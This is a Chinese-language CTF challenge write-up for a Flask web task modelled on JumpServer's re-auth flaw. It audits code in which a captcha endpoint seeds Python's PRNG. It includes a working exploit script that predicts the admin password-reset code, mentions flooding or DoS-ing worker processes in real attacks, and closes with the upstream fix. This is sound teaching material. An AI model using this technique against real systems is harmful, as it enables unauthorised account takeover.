# FlagServer

- 作者：13m0n4de
- 参考：-
- 难度：Medium
- 分类：Web
- 镜像：[svuctf-winter-2023/flagserver](https://ghcr.io/svuctf/svuctf-winter-2023/flagserver:latest)
- 端口：5000

## 题目描述

> Hint：不需要爆破

## 题目解析

依照前几个月 [JumpServer](https://github.com/jumpserver/jumpserver/) 的 re-auth 漏洞制作的 CTF 题。

相关文章：[ jumpserver最新re-auth复现（伪随机经典案例） ](https://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw)

这题简化了很多，为的是让选手在代码审计上会轻松一些，即使没看过漏洞分析也能做这题。在题解的最后会与 JumpServer 漏洞利用进行对比，分析实际情况中还需要解决什么问题。

### 前置知识

在新生赛 [绝对安全的随机数生成器](https://github.com/SVUCTF/SVUCTF-HELLOWORLD-2023/blob/main/challenges/ppc/prng/README.md) 中介绍过伪随机数的概念：

> 对于大多伪随机数生成器（PRNG），内部状态是其核心组成部分，它包含了生成伪随机数的算法所需的信息和数据，一般会由一个种子（Seed）来初始化。
> 在同一个伪随机数算法中，如果内部状态一致，那么生成出的随机数也将一致。
> 所以说种子被泄漏，内部状态也就可以初始化为完全一致的数据，继而预测随机数的生成

以 C 语言举例，两次播同样的随机数种子，将会得到相同的随机数序列：

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
  srand(2023);
  printf("%d\n", rand());
  printf("%d\n", rand());
  printf("%d\n", rand());

  puts("--------");

  srand(2023);
  printf("%d\n", rand());
  printf("%d\n", rand());
  printf("%d\n", rand());

  return 0;
}
```

```
1033193930
278388770
1574118255
--------
1033193930
278388770
1574118255
```

在 Python 中也是一样：

```python
>>> import random
>>> random.seed(2023)
>>> random.random()
0.3829219244542088
>>> random.randint(0, 100)
57
>>> random.choice([0, 2, 4, 6])
6
>>>
>>>
>>> random.seed(2023)
>>> random.random()
0.3829219244542088
>>> random.randint(0, 100)
57
>>> random.choice([0, 2, 4, 6])
6
```

**但随机函数种类、次数或顺序不一致，结果是不一样的。**

### 代码审计

附件给的是完整项目，也就是 [app](build/app/) 目录里的所有文件，拿到这么多文件不要慌张，先判断出使用的框架，了解了框架的目录结构后能对项目有个整体把握。

先找到项目的入口，即程序开始执行的位置，有两个方法。

- 查找主运行文件：\
  大多数 Python 项目都有一个主运行文件，通常以 `main.py`、`app.py`、`run.py` 等命名。
- 查看 `__main__` 模块：\
  在 Python 中，一个模块的 `__name__` 属性会在执行时被设置。如果一个文件是被直接执行的，其 `__name__` 属性将被设置为 `"__main__"`\
  可以查找是否存在类似以下的代码：
  ```python
  if __name__ == "__main__":
  ```

但这里并不典型，以上两种方式都不太好判断，和部署时的启动方式有关，这种情况下只能根据文件名和经验推断了。

在 [\_\_init\_\_.py](build/app/__init__.py) 中找到以下代码，可以判断出使用的是 [Flask](https://github.com/pallets/flask) 框架。

```python
app = Flask(__name__)
```

Flask 默认将 `static` 作为静态资源的文件夹，存放 JavaScript 、CSS 、图片等文件，将 `templates` 作为页面模板文件夹。

这两个目录可以暂时忽略，优先从后端的处理逻辑入手，也就是那些 Python 文件。

[config.py](build/app/config.py) 中有 `Config` 类：

```python
# config.py:5-7
class Config(object):
    SECRET_KEY = secrets.token_hex(16)
    FLAG = os.getenv("GZCTF_FLAG", "flag{fake_flag}")
```

在 Flask 启动时加入配置中，意思是设置 `SECRET_KEY` 为随机的 16 位字符，FLAG 从环境变量中读取。

```python
# __init__py:17
app.config.from_object(Config())
```

并且可以在其他地方使用 `app.config["FLAG"]` 获得 FLAG 值

```python
# __init__.py:40-41
if session.get("user") == "admin":
    return render_template("home.html", flag=app.config["FLAG"])
```

程序定义了六条路由 `/` 会跳转到 `/home` ，`/home` 如果没有作为 `admin` 登录的话就会跳转到 `/auth/login`

```python
# __init__py:33-43
@app.route("/")
def index():
    return redirect(url_for("home"))


@app.route("/home")
def home():
    if session.get("user") == "admin":
        return render_template("home.html", flag=app.config["FLAG"])
    else:
        return redirect(url_for("login"))
```

#### 登录

`/auth/login`：

```python
# __init__py:46:68
@app.route("/auth/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        captcha = request.form["captcha"]

        if captcha.lower() != session["captcha"].lower():
            return render_template("login.html", message="Invalid CAPTCHA")

        if user := next(
            (u for u in USERS if u.username == username and u.password == password),
            None,
        ):
            session["user"] = user.username
            return redirect(url_for("home"))
        else:
            return render_template(
                "login.html",
                message="The username or password you entered is incorrect",
            )

    return render_template("login.html")
```

从 POST 表单请求中获取用户名、密码、验证码，接着判断传入验证码和 Session 中保存的验证码是否相同。

然后来到了一个有点怪异的代码，老实说，是故意的，因为题目考点是代码审计，语言特性不得不品尝。

```python
# __init__py:56-59
if user := next(
    (u for u in USERS if u.username == username and u.password == password),
    None,
):
```

先看 `:=` 右侧，`next` 函数中有两个参数，第一个是 Python 的[列表推导式](https://www.liaoxuefeng.com/wiki/1016959663602400/1017317609699776)。

```python
(u for u in USERS if u.username == username and u.password == password)
```

它做的事情就是从 `USERS` 中遍历出元素 `u`，并判断 `u` 的 `username` 和 `password` 字段与用户传入的是否相等，如果相等则返回（生成元素） `u` ，最终返回一个[生成器](https://www.liaoxuefeng.com/wiki/1016959663602400/1017318207388128)。
所以它其实就是从 `USERS` 里面找到成功登录的用户，没有的话生成一个空的生成器，有的话就是包含全部登录成功用户的生成器咯。

那么代码就变成了：

```python
next(生成器, None)
```

`next` 函数用于获取一个可迭代对象的下一个元素。如果迭代器耗尽，抛出 `StopIteration` 异常，如果指定了默认值就返回默认值。

这里的代码指定了默认值，为 `None`，所以就是从“可登录用户中”获得第一个用户，如果没有就获得一个 `None`。

现在我们知道了，`user :=` 后的表达式返回用户或者 `None`，那 `:=` 是什么东西？

这个是 Python 中的海象运算符（横过来看，很形象吧），它允许我们在条件判断的同时计算并赋值。

例子：

```python
# 传统写法
my_dict = {'a': 1, 'b': 2, 'c': 3}
key = 'd'

value = my_dict.get(key)
if value is not None:
    print(f"键 '{key}' 对应的值是 {value}")
else:
    print(f"键 '{key}' 不存在")

# 使用海象运算符的写法
key = 'd'
if (value := my_dict.get(key)) is not None:
    print(f"键 '{key}' 对应的值是 {value}")
else:
    print(f"键 '{key}' 不存在")

# 更进一步简化
key = 'd'
if value := my_dict.get(key):
    print(f"键 '{key}' 对应的值是 {value}")
else:
    print(f"键 '{key}' 不存在")
```

可以看到 `:=` 可以减少一些冗余代码。

至于为什么可以进一步简化，因为在 Python 中，任何非零、非空、非 `None` 的值都被视为 `True`，所以 `is not None` 也可以不写。

这题的代码就是简化之后的结果：

```python
# __init__py:56-66
# 获取登录成功的用户赋值给 user，如果没有的话进入 else 语句
if user := next(
    (u for u in USERS if u.username == username and u.password == password),  # 构造生成器，存有登录成功的用户们
    None,  # 默认值
):
    session["user"] = user.username  # user 是登录成功的用户，通过 user.username 获得用户名
    return redirect(url_for("home"))
else:
    return render_template(
        "login.html",
        message="The username or password you entered is incorrect",
    )
```

登录成功会将 `session["user"]` 设置为用户名，跳转到 `/home` ，然后就会显示出 Flag 了。

登录失败的话，在登录页面显示信息 `The username or password you entered is incorrect` 。

绕了半天，原来只是个登录罢了。

这么写代码还有一小部分原因是题目没用数据库，用户列表以及每个用户的信息使用了全局变量。

```python
# __init__py:20-30

# 用户类
class User:
    def __init__(self, username: str, email: str, password: str, reset_code: str):
        self.username = username  # 用户名
        self.email = email  # 邮箱
        self.password = password  # 密码
        self.reset_code = reset_code  # 找回密码时的重置代码


# 用户列表，这里只有一个 admin 用户，密码和验证代码初始化时都是随机的
USERS: List[User] = [
    User("admin", "admin@svuctf.com", secrets.token_hex(16), secrets.token_hex(8))
]
```

#### 找回密码

有了上面的分析，看其他代码就没那么困难了。

找回密码页面一共会发两个请求，一个用于发送验证码到邮箱，一个用于提交验证码重置密码。

发送验证码的逻辑：

```python
# __init__py:71-93
@app.route("/auth/password/forget/send_code", methods=["POST"])
def send_code():
    email = request.form["email"]

    if user := next((u for u in USERS if u.email == email), None):
        user.reset_code = random_code(8)
        return jsonify({"success": True, "message": "Code sent successfully"})
    else:
        return jsonify({"success": False, "message": "Email does not exist"})
```

`if user := next((u for u in USERS if u.email == email), None):` 是老朋友了，通过邮箱查找用户。

然后将此用户的 `reset_code` 设置为 `random_code(8)` 。

`random_code` 函数在 [utils.py](./build/app/utils.py) 中：

```python
# utils.py:12-15
def random_code(length: int) -> str:
    code_list = random.sample(string.digits + string.ascii_letters, length)
    code = "".join(code_list)
    return code
```

使用了 `random` 模块的 `sample` 函数来获取 `string.digits + string.ascii_letters` 的 `length` 个值，并拼成一个字符串。

`string.digits + string.ascii_letters` 是大小写英文字母和所有数字。

所以说当我们传入邮箱时，会设置八位随机的“重置代码”。

重置密码的逻辑：

```python
# __init__py:71-90
@app.route("/auth/password/forget", methods=["GET", "POST"])
def forget():
    if request.method == "POST":
        email = request.form["email"]
        user_code = request.form["code"]

        if user := next((u for u in USERS if u.email == email), None):
            if user.reset_code == user_code:
                new_password = random_password()
                user.password = new_password
                return render_template(
                    "forget.html",
                    message=f"Password reset successfully! Your new password is: {new_password}",
                )

        return render_template(
            "forget.html", message="Invalid email or code", error=True
        )

    return render_template("forget.html")
```

POST 发送邮箱和对应的重置代码，如果符合的话，使用 `random_password` 函数生成新密码并显示在页面上，不重复介绍了。

都是随机的，那还怎么搞嘛？别担心，还有不起眼的一部分没分析完。

#### 验证码图片

这里的验证码说的是登录时页面上的验证码，而不是重置密码时的重置代码。

生成验证码：

```python
# __init__py:104-112
@app.route("/auth/captcha/image/<key>")
def captcha_img(key: str):
    captcha, image = captcha_image(key)
    session["captcha"] = captcha

    response = make_response(image)
    response.headers.set("Content-Type", "image/jpeg")

    return response
```

调用了 `captcha_image` 函数生成验证码和对应图片，将 `session["captcha"]` 设置为验证码字符串，将验证码图片返回。

`captcha_image` 在：

```python
# utils.py:22-45
def captcha_image(key: str) -> Tuple[str, BytesIO]:
    font_size, font_num = 48, 5

    random.seed(key)

    font_path = os.path.join(os.path.dirname(__file__), "assets/Vera.ttf")
    font = ImageFont.truetype(font_path, font_size)

    text = get_text(font_num)
    size = get_size(font, text)
    size = (int(size[0] * 1.1), int(size[1] * 1.2))

    image = Image.new(mode="RGB", size=size, color="#ffffff")

    draw = ImageDraw.Draw(image)
    draw.text((0, 0), text, font=font, fill="#609b8a")

    noise_dots(draw, image)

    io = BytesIO()
    image.save(io, "JPEG")
    io.seek(0)

    return text, io
```

代码量有点多，但有个很扎眼的 `random.seed(key)` ，其中 `key` 就是此函数的参数。

我们请求时可以在路由中传入这个 `key` 的值：

```python
# __init__py:104-106
@app.route("/auth/captcha/image/<key>")
def captcha_img(key: str):
    captcha, image = captcha_image(key)
```

`<key>` 是 Flask 的语法，详细查阅官方文档。

总之我们的 `key` 会通过 `/auth/captcha/image/my_custom_key` 传入，调用 `captcha_image("my_custom_key")` ，最后设置随机数种子 `random.seed("my_custom_key")` 。

好事一桩？直接设置种子为我们自定义的，然后点击 `send code` 让服务端生成重置代码 `reset_code`，最后我们本地也同样 `random_code(8)` 一下，同样的种子得同样的结果，我们岂不是得到了重置代码？

对，但还没那么简单，在生成随机重置代码前，`captcha_image` 生成图片时就已经用到了一些随机函数。

比如图片文本是随机生成的：

```python
# utils.py:23
font_size, font_num = 48, 5

# utils.py:30
text = get_text(font_num)  # 获取五个随机字符

# utils.py:53-56
# 生成指定数量的随机字符（大写英文字母和数字）
def get_text(length: int) -> str:
    source = string.digits + string.ascii_uppercase
    text = "".join(random.sample(source, length))
    return text
```

它会使用一次 `random.sample` ，我们想要得到同样的重置代码，也得有这一次。（还记得文章最初的示例吗，随机数生成的顺序和次数也很重要）

除了图片文本，图片背景还有许多噪点，它也是随机的：

```python
# utils.py:59-65
def noise_dots(draw: ImageDraw.ImageDraw, image: Image.Image):
    size = image.size
    for _ in range(int(size[0] * size[1] * 0.1)):
        draw.point(
            (random.randint(0, size[0]), random.randint(0, size[1])),
            fill="#609b8a",
        )
```

它根据图片的长宽，一共循环了 长 x 宽 x 0.1 次（取整），每次循环使用 `randint` 随机两次。

这些我们也得模拟出来。

### 利用

审计完毕，利用路径：

- 访问 `/auth/captcha/image/my_seek` 设置种子为 `"my_seed"`
- 在本地脚本中设置种子为 `"my_seed"`
- 在本地脚本中复刻验证码图片生成时的所有随机操作
- 使用与 `random_code(8)` 同样的代码生成重置代码
- 发送 admin 的邮箱到 `/auth/password/forget/send_code`，服务端会生成重置代码
- 你得到的代码和服务端的代码此时完全一样
- 使用重置代码和邮箱来重置 admin 密码

图片的长宽获取很简单，而且 `key` 相同的时候，每次生成的图片是完全一样的，保存下来手动查看也可以。

这里是一个简单的脚本，来自动化生成重置代码，[exp.py](./writeup/exp.py)

```python
import string
import random
import requests
from PIL import Image

url = "http://127.0.0.1:5000"
session = requests.session()

key = "zzz"
random.seed(key)

# 获得验证码，设置远程种子
resp = session.get(f"{url}/auth/captcha/image/{key}", stream=True)
image = Image.open(resp.raw)

# 验证码文本生成中的随机操作
# gettext
random.sample(string.digits + string.ascii_uppercase, 5)

# 噪点生成中的随机操作
# noise_dots
width, height = image.size
for _ in range(int(width * height * 0.1)):
    random.randint(0, width)
    random.randint(0, height)

# 生成重置代码
# random_code
code_list = random.sample(string.digits + string.ascii_letters, 8)
code = "".join(code_list)

print(code)
```

得到代码 `FAOsow0T` ，此时不要点击网页上的发送验证码按钮，否则会再次刷新重置代码的。

使用 `FAOsow0T` 重置 `admin@svuctf.com` 的密码，网页返回新的密码，回到登录页面登录就能看到 Flag 了。

（登录使用用户名，找回密码使用邮箱，不要搞错了）

## 额外内容

### 实际利用时的其他难点

JumpServer 的漏洞大致都在题目里展现了，但实际情况中，处理请求的服务会有很多个进程，不能保证设置种子的进程和生成重置代码的进程一致。

有两种方法，先用某些 DOS 攻击将所有进程打重启，然后全部设置为你的种子；或者干脆发送超大量的请求，力求覆盖所有进程。

我觉得这个不是漏洞核心，不重要，所以没放在题里，特地指定了一个进程来启动服务器：

```
gunicorn app:app -b 0.0.0.0:5000 -w 1
```

除了这个难点，还有 JumpServer 的“随机深度”不那么确定，并不是一个 `get_text` 和一个 `noise_dots` 那么简单且固定的，可能会需要爆破小几十次。

*“随机深度”是文章开头推荐的文章中定义的，代表了“随机多少次才能与服务端同步”*

### 出题的小心机

为了更有 JumpServer 味，路由和界面都尽可能地仿照了，还是蛮像的吧。

![screenshot](./writeup/screenshot.png)

[这张图片](./build/app/static/img/logo.png)是 AI 生成的，本来是为了契合比赛主题（原先的主题不是圣诞而是猫娘，致敬某位学长）。

网页上放的是原图，可以从 EXIF 信息中得到生成的各项参数，复刻一张。

~~所以 [题解分享频道](../writeup_channel/README.md) 不是扯谎频道，讲得都是大实话。~~

### 修复手段

图片验证码是使用 [django-simple-captcha](https://github.com/mbi/django-simple-captcha) 库生成的，它们的修复方式是在生成验证码图片之后，调用 `random.seed()` ，这样就再次把种子设置为几乎不可测的系统时间了：

https://github.com/mbi/django-simple-captcha/blob/fddf2fefd26540b432ae43c6971134e4b192c875/captcha/views.py#L138-L143

```python
    # At line :50 above we fixed the random seed so that we always generate the
    # same image, see: https://github.com/mbi/django-simple-captcha/pull/194
    # This is a problem though, because knowledge of the seed will let an attacker
    # predict the next random (globally). We therefore reset the random here.
    # Reported in https://github.com/mbi/django-simple-captcha/pull/221
    random.seed()
```
